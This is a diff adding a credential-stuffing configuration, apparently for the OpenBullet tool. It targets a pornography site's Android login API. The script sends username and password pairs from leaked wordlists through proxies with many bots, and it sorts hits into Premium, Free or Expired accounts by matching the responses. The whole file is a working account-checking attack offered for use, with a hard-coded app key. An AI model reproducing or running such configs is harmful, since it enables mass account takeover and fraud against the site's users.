@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "PHUB",
+  "SuggestedBots": 200,
+  "LastModified": "2018-05-05T18:28:00.0276909+02:00",
+  "AdditionalInfo": "Captures free and premium in the respective categories",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://api.pornhub.com/api_android_v3/login?appKey=72d2512a43364263e9d94f0f73&uuid=34799015ecdf4e60&username=<USER>&password=<PASS>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "userType\":\"Premium\"" 
+  KEYCHAIN Failure OR 
+    KEY "INVALID USERNAME OR PASSWORD" 
+    KEY "MISSING OR EMPTY" 
+    KEY "Loading ..." 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "userType\":\"Expired\"" 
+    KEY "userType\":\"Free\"" 
